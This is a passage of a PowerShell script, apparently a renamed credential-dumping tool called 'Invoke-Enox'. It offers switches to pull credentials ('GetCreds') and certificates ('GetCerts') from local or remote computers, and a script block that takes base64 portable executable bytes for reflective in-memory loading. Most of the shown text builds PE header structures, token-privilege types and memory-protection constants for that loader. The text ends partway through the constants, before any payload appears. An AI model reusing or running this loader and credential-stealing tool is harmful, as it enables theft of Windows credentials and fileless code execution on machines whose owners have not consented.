function Invoke-Enox
{
[CmdletBinding(DefaultParameterSetName='GetCreds')]
Param(
    [Parameter(Position = 0)]
    [String[]]
    $ComputerName,
    [Parameter(ParameterSetName = 'GetCreds', Position = 1)]
    [Switch]
    $GetCreds,
    [Parameter(ParameterSetName = 'GetCerts', Position = 1)]
    [Switch]
    $GetCerts,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
$NoLocalScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $PortableExecutableBytes64,
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $PortableExecutableBytes32,
        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $FuncReturnType,
        [Parameter(Position = 3, Mandatory = $false)]
        [Int32]
        $ProcId,
        [Parameter(Position = 4, Mandatory = $false)]
        [String]
        $ProcName,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExecutableArgs
    )
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)
        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)
        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)
        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)
        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES
        return $Win32Types
    }
    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
